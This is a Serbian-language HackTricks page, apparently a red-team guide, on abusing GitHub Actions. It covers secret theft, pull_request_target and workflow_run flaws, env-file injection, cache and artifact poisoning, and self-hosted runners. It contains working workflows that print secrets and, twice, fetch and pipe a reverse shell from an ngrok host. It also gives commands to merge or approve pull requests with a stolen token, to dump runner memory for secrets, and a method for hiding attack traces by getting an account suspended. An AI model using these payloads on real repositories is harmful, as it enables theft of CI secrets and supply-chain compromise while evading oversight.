# Zloupotreba Github Actions

{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## Osnovne Informacije

Na ovoj stranici ćete pronaći:

* **Sažetak svih uticaja** napadača koji uspe da pristupi Github Action
* Različite načine za **dobijanje pristupa akciji**:
* Imati **dozvole** za kreiranje akcije
* Zloupotreba **pull request** povezanih okidača
* Zloupotreba **drugih eksternih pristupnih** tehnika
* **Pivotiranje** iz već kompromitovanog repozitorijuma
* Na kraju, sekcija o **post-eksploatacionim tehnikama za zloupotrebu akcije iznutra** (uzrokovanje pomenutih uticaja)

## Sažetak Uticaja

Za uvod o [**Github Actions pogledajte osnovne informacije**](../basic-github-information.md#github-actions).

U slučaju da možete **izvršavati proizvoljne Github akcije/ubacivati kod** u **repozitorijum**, mogli biste:

* **Ukrasti** **tajne** iz tog repozitorijuma/organizacije.
* Ako možete samo ubacivati, možete ukrasti šta god je već prisutno u workflow-u.
* Zloupotrebiti **privilegije repozitorijuma** za pristup drugim platformama kao što su AWS i GCP.
* **Izvršavati kod u prilagođenim radnicima** (ako se koriste prilagođeni radnici) i pokušati pivotirati odatle.
* **Prepisati** kod repozitorijuma.
* Ovo zavisi od privilegija `GITHUB_TOKEN` (ako ih ima).
* **Kompromitovati** **deploymente** i druge **artefakte**.
* Ako kod deployuje ili skladišti nešto, mogli biste to modifikovati i dobiti dalji pristup.

## GITHUB\_TOKEN

Ovaj "**secret**" (dolazi iz `${{ secrets.GITHUB_TOKEN }}` i `${{ github.token }}`) se daje kada admin omogući ovu opciju:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Ovaj token je isti onaj koji će koristiti **Github Application**, tako da može pristupiti istim endpoint-ovima: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github bi trebalo da objavi [**flow**](https://github.com/github/roadmap/issues/74) koji **omogućava pristup između repozitorijuma** unutar GitHub-a, tako da repozitorijum može pristupiti drugim internim repozitorijumima koristeći `GITHUB_TOKEN`.
{% endhint %}

Možete videti moguće **dozvole** ovog tokena na: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Napomena da token **ističe nakon završetka posla**.\
Ovi tokeni izgledaju ovako: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Neke zanimljive stvari koje možete uraditi sa ovim tokenom:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Imajte na umu da ćete u nekoliko navrata moći pronaći **github korisničke tokene unutar Github Actions envs ili u tajnama**. Ovi tokeni vam mogu dati više privilegija nad repozitorijumom i organizacijom.
{% endhint %}

<details>

<summary>Prikaži tajne u Github Action izlazu</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverse shell-a sa secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Moguće je proveriti dozvole date Github Token-u u repozitorijumima drugih korisnika **proverom logova** akcija:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Dozvoljeno Izvršenje

{% hint style="info" %}
Ovo bi bio najlakši način da kompromitujete Github akcije, jer ovaj slučaj pretpostavlja da imate pristup da **kreirate novi repo u organizaciji**, ili imate **prava pisanja nad repozitorijumom**.

Ako ste u ovom scenariju, možete jednostavno proveriti [Post Exploitation tehnike](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Izvršenje iz Kreiranja Repozitorijuma

U slučaju da članovi organizacije mogu **kreirati nove repozitorijume** i možete izvršavati github akcije, možete **kreirati novi repo i ukrasti tajne postavljene na nivou organizacije**.

### Izvršenje iz Nove Grane

Ako možete **kreirati novu granu u repozitorijumu koji već sadrži Github Akciju** konfigurisan, možete ga **modifikovati**, **uploadovati** sadržaj, a zatim **izvršiti tu akciju iz nove grane**. Na ovaj način možete **eksfiltrirati tajne repozitorijuma i organizacije** (ali morate znati kako se zovu).

Možete učiniti modifikovanu akciju izvršivom **ručno**, kada se **PR kreira** ili kada se **neki kod push-uje** (u zavisnosti od toga koliko želite da budete bučni):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
Postoje različiti okidači koji bi mogli omogućiti napadaču da **izvrši Github Action drugog repozitorijuma**. Ako su te akcije koje se mogu pokrenuti loše konfigurisane, napadač bi mogao da ih kompromituje.
{% endhint %}

### `pull_request`

Okidač workflow-a **`pull_request`** će izvršiti workflow svaki put kada se primi pull request sa nekim izuzecima: po defaultu, ako je to **prvi put** da **sarađujete**, neki **održavalac** će morati da **odobri** **pokretanje** workflow-a:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Kako je **default ograničenje** za **prvi put** saradnike, možete doprineti **ispravljanjem validne greške/pravopisne greške** i zatim poslati **druge PR-ove da zloupotrebite svoje nove `pull_request` privilegije**.

**Testirao sam ovo i ne radi**: ~~Druga opcija bi bila da kreirate nalog sa imenom nekoga ko je doprineo projektu i obrisao svoj nalog.~~
{% endhint %}

Štaviše, po defaultu **sprečava dozvole za pisanje** i **pristup tajnama** ciljnog repozitorijuma kao što je navedeno u [**dokumentaciji**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Sa izuzetkom `GITHUB_TOKEN`, **tajne se ne prenose na runner** kada je workflow pokrenut iz **forkovanog** repozitorijuma. **`GITHUB_TOKEN` ima samo dozvole za čitanje** u pull request-ovima **iz forkovanih repozitorijuma**.

Napadač bi mogao da izmeni definiciju Github Action-a kako bi izvršio proizvoljne stvari i dodao proizvoljne akcije. Međutim, neće moći da ukrade tajne ili prepiše repozitorijum zbog pomenutih ograničenja.

{% hint style="danger" %}
**Da, ako napadač promeni u PR-u github action koji će biti pokrenut, njegov Github Action će biti korišćen, a ne onaj iz originalnog repozitorijuma!**
{% endhint %}

Kako napadač takođe kontroliše kod koji se izvršava, čak i ako nema tajni ili dozvola za pisanje na `GITHUB_TOKEN`, napadač bi mogao, na primer, **upload-ovati zlonamerne artefakte**.

### **`pull_request_target`**

Okidač workflow-a **`pull_request_target`** ima **dozvolu za pisanje** u ciljni repozitorijum i **pristup tajnama** (i ne traži dozvolu).

Napomena da okidač workflow-a **`pull_request_target`** **radi u osnovnom kontekstu** a ne u onom koji daje PR (da **ne izvršava nepouzdani kod**). Za više informacija o `pull_request_target` [**pogledajte dokumentaciju**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Štaviše, za više informacija o ovoj specifičnoj opasnoj upotrebi pogledajte ovaj [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Možda izgleda da je **izvršeni workflow** onaj definisan u **osnovi** i **ne u PR-u** pa je **sigurno** koristiti **`pull_request_target`**, ali postoje **nekoliko slučajeva gde nije**.

A ovaj će imati **pristup tajnama**.

### `workflow_run`

Okidač [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) omogućava pokretanje workflow-a iz drugog kada je `completed`, `requested` ili `in_progress`.

U ovom primeru, workflow je konfigurisana da se pokrene nakon što se završi zasebni "Run Tests" workflow:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Štaviše, prema dokumentaciji: Workflow pokrenut događajem `workflow_run` može **pristupiti tajnama i pisati tokene, čak i ako prethodni workflow nije mogao**.

Ovakav workflow može biti napadnut ako **zavisi** od **workflow-a** koji može biti **pokrenut** od strane eksternog korisnika putem **`pull_request`** ili **`pull_request_target`**. Nekoliko ranjivih primera može se [**pronaći na ovom blogu**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** Prvi primer se sastoji od workflow-a pokrenutog `workflow_run` koji preuzima napadačev kod: `${{ github.event.pull_request.head.sha }}`\
Drugi primer se sastoji od **prosleđivanja** **artefakta** iz **nepouzdanog** koda u workflow `workflow_run` i korišćenja sadržaja tog artefakta na način koji ga čini **ranjivim na RCE**.

### `workflow_call`

TODO

TODO: Proveriti da li kada se izvršava iz pull\_request koristi/preuzima kod iz originala ili iz forkovanog PR-a

## Zloupotreba Forkovanog Izvršenja

Pomenuli smo sve načine na koje eksterni napadač može naterati github workflow da se izvrši, sada da pogledamo kako se ta izvršenja, ako su loše konfigurisana, mogu zloupotrebiti:

### Nepouzdano izvršenje checkout-a

U slučaju **`pull_request`,** workflow će se izvršiti u **kontekstu PR-a** (tako da će izvršiti **zlonamerni kod PR-a**), ali neko mora **prvo da ga odobri** i izvršiće se sa nekim [ograničenjima](./#pull\_request).

U slučaju workflow-a koji koristi **`pull_request_target` ili `workflow_run`** koji zavisi od workflow-a koji može biti pokrenut iz **`pull_request_target` ili `pull_request`** kod iz originalnog repozitorijuma će biti izvršen, tako da **napadač ne može kontrolisati izvršeni kod**.

{% hint style="danger" %}
Međutim, ako **akcija** ima **eksplicitni PR checkout** koji će **preuzeti kod iz PR-a** (a ne iz baze), koristiće kod koji kontroliše napadač. Na primer (pogledajte liniju 12 gde se preuzima kod PR-a):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># NESIGURNO. Pruženo samo kao primer.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potencijalno **nepouzdan kod se izvršava tokom `npm install` ili `npm build`** jer su build skripte i referencirani **paketi kontrolisani od strane autora PR-a**.

{% hint style="warning" %}
GitHub dork za pretragu ranjivih akcija je: `event.pull_request pull_request_target extension:yml` međutim, postoje različiti načini za konfigurisanje poslova da se izvršavaju sigurno čak i ako je akcija konfigurisana nesigurno (kao što je korišćenje uslovnih izraza o tome ko je akter koji generiše PR).
{% endhint %}

### Injekcije skripti u kontekstu <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Napomena da postoje određeni [**github konteksti**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) čije vrednosti su **kontrolisane** od strane **korisnika** koji kreira PR. Ako github akcija koristi te **podatke za izvršenje bilo čega**, to može dovesti do **arbitrarne izvršenja koda:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Injekcija Skripti** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Prema dokumentaciji: Možete učiniti da je **promenljiva okruženja dostupna bilo kojem sledećem koraku** u workflow poslu definisanjem ili ažuriranjem promenljive okruženja i pisanjem toga u **`GITHUB_ENV`** datoteku okruženja.

Ako napadač može **ubaciti bilo koju vrednost** unutar ove **env** promenljive, mogao bi ubaciti env promenljive koje mogu izvršiti kod u sledećim koracima kao što su **LD\_PRELOAD** ili **NODE\_OPTIONS**.

Na primer ([**ovaj**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) i [**ovaj**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), zamislite workflow koji veruje uploadovanom artefaktu da sačuva njegov sadržaj unutar **`GITHUB_ENV`** env promenljive. Napadač bi mogao uploadovati nešto poput ovoga da ga kompromituje:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Ranjive Treće Strane Github Akcije

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Kao što je pomenuto u [**ovom blog postu**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), ova Github Akcija omogućava pristup artefaktima iz različitih workflow-a pa čak i repozitorijuma.

Problem je što ako parametar **`path`** nije postavljen, artefakt se ekstrahuje u trenutni direktorijum i može prepisati fajlove koji bi kasnije mogli biti korišćeni ili čak izvršeni u workflow-u. Dakle, ako je Artefakt ranjiv, napadač bi mogao zloupotrebiti ovo da kompromituje druge workflow-e koji veruju Artefaktu.

Primer ranjivog workflow-a:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Ovo bi moglo biti napadnuto sa ovim workflow-om:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Ostali Spoljni Pristup

### Otmica Obrisane Imeničke Repozitorijuma

Ako nalog promeni svoje ime, drugi korisnik može registrovati nalog sa tim imenom nakon nekog vremena. Ako je repozitorijum imao **manje od 100 zvezdica pre promene imena**, Github će omogućiti novom registrovanom korisniku sa istim imenom da kreira **repozitorijum sa istim imenom** kao onaj obrisani.

{% hint style="danger" %}
Dakle, ako akcija koristi repozitorijum sa nepostojećeg naloga, i dalje je moguće da napadač kreira taj nalog i kompromituje akciju.
{% endhint %}

Ako su drugi repozitorijumi koristili **zavisnosti iz repozitorijuma ovog korisnika**, napadač će moći da ih otme. Ovde imate potpunije objašnjenje: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Preusmeravanje Repozitorijuma

{% hint style="info" %}
U ovom odeljku ćemo govoriti o tehnikama koje omogućavaju **preusmeravanje sa jednog repozitorijuma na drugi** pod pretpostavkom da imamo neku vrstu pristupa prvom (pogledajte prethodni odeljak).
{% endhint %}

### Trovanje Keša

Keš se održava između **pokretanja radnih tokova na istoj grani**. Što znači da ako napadač **kompromituje** **paket** koji se zatim čuva u kešu i **preuzima** i izvršava **radni tok sa više privilegija**, on će moći da **kompromituje** i taj radni tok.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Trovanje Artefakata

Radni tokovi mogu koristiti **artefakte iz drugih radnih tokova, pa čak i repozitorijuma**, ako napadač uspe da **kompromituje** Github Akciju koja **otprema artefakt** koji se kasnije koristi u drugom radnom toku, on može **kompromitovati druge radne tokove**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Eksploatacija iz Akcije

### Pristup AWS i GCP putem OIDC

Pogledajte sledeće stranice:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Pristup tajnama <a href="#accessing-secrets" id="accessing-secrets"></a>

Ako ubacujete sadržaj u skriptu, zanimljivo je znati kako možete pristupiti tajnama:

* Ako je tajna ili token postavljen kao **promenljiva okruženja**, može se direktno pristupiti kroz okruženje koristeći **`printenv`**.

<details>

<summary>Lista tajni u izlazu Github Akcije</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Dobijanje reverse shell-a sa secrets</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Ako se tajna koristi **direktno u izrazu**, generisani shell skript se čuva **na disku** i dostupan je.
* ```bash
cat /home/runner/work/_temp/*
```
* Za JavaScript actions tajne se šalju kroz promenljive okruženja
* ```bash
ps axe | grep node
```
* Za **custom action**, rizik može varirati u zavisnosti od toga kako program koristi tajnu dobijenu iz **argumenta**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Zloupotreba Self-hosted runners

Način da se pronađe koje **Github Actions se izvršavaju u ne-github infrastrukturi** je pretraga za **`runs-on: self-hosted`** u Github Action konfiguracionom yaml fajlu.

**Self-hosted** runners mogu imati pristup **dodatnim osetljivim informacijama**, drugim **mrežnim sistemima** (ranjivi krajnji tačke u mreži? metadata service?) ili, čak i ako su izolovani i uništeni, **više od jedne akcije može biti pokrenuto u isto vreme** i zlonamerna akcija može **ukrasti tajne** druge akcije.

U self-hosted runners je takođe moguće dobiti **tajne iz \_Runner.Listener**\_\*\* procesa\*\* koji će sadržati sve tajne workflow-a u bilo kom koraku tako što se isprazni njegova memorija:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Pogledajte [**ovaj post za više informacija**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Moguće je napraviti Github actions koje će **izgraditi i sačuvati Docker sliku unutar Github-a**.\
Primer se može naći u sledećem proširivom delu:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Kao što ste mogli videti u prethodnom kodu, Github registar je hostovan u **`ghcr.io`**.

Korisnik sa dozvolama za čitanje nad repozitorijumom će tada moći da preuzme Docker Image koristeći lični pristupni token:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Zatim, korisnik može pretražiti **procurele tajne u Docker slojevima slike:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Osetljive informacije u Github Actions logovima

Čak i ako **Github** pokušava da **detektuje tajne vrednosti** u logovima akcija i **izbegne njihovo prikazivanje**, **druge osetljive podatke** koji su mogli biti generisani tokom izvršenja akcije neće biti sakriveni. Na primer, JWT potpisan sa tajnom vrednošću neće biti sakriven osim ako nije [specifično konfigurisan](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Prikrivanje tragova

(Tehnika iz [**ovde**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Prvo, svaki PR koji je podignut je jasno vidljiv javnosti na Github-u i ciljanom GitHub nalogu. Na Github-u po defaultu, **ne možemo obrisati PR sa interneta**, ali postoji zaokret. Za Github naloge koji su **suspendovani** od strane Github-a, svi njihovi **PR-ovi su automatski obrisani** i uklonjeni sa interneta. Dakle, da biste sakrili svoju aktivnost, potrebno je ili da vam **GitHub nalog bude suspendovan ili da vam nalog bude označen**. Ovo bi **sakrilo sve vaše aktivnosti** na GitHub-u sa interneta (u suštini uklonilo sve vaše exploit PR-ove).

Organizacija na GitHub-u je veoma proaktivna u prijavljivanju naloga GitHub-u. Sve što treba da uradite je da podelite “neke stvari” u Issue i oni će se pobrinuti da vaš nalog bude suspendovan za 12 sati :p i eto, učinili ste svoj exploit nevidljivim na github-u.

{% hint style="warning" %}
Jedini način da organizacija shvati da je bila meta je da proveri GitHub logove iz SIEM-a jer sa GitHub UI-a PR bi bio uklonjen.
{% endhint %}

## Alati

Sledeći alati su korisni za pronalaženje Github Action workflow-ova i čak pronalaženje ranjivih:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Naučite i vežbajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitter-u** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove podnošenjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
